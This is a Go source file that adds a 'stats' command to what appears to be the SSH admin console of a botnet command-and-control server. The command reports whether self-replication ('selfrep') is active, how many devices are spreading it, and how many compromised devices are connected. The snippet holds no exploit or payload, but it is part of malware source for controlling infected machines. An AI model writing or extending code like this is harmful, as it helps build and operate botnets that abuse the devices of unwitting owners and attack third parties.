package commands

import (
	"admin/source/attacks"
	"admin/source/terminal"
	"fmt"

	"golang.org/x/crypto/ssh"
)

func init() {
	RegisterCommand(&Command{
		Name:        "stats",
		Prefix:      "",
		Admin:       false,
		Description: "Stats for the current module",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			term.Write([]byte(fmt.Sprintf("%sSelfrep active\x1b[38;5;15m: %s\r\n", term.Colour, parse(attacks.SelfreppingDevices()>0))))
			term.Write([]byte(fmt.Sprintf("%sDevices selfrepping\x1b[38;5;15m: %d\r\n", term.Colour, attacks.SelfreppingDevices())))
			term.Write([]byte(fmt.Sprintf("%sTotal devices connected\x1b[38;5;15m: %d\r\n", term.Colour, len(attacks.Devices))))
			return nil
		},
	})
}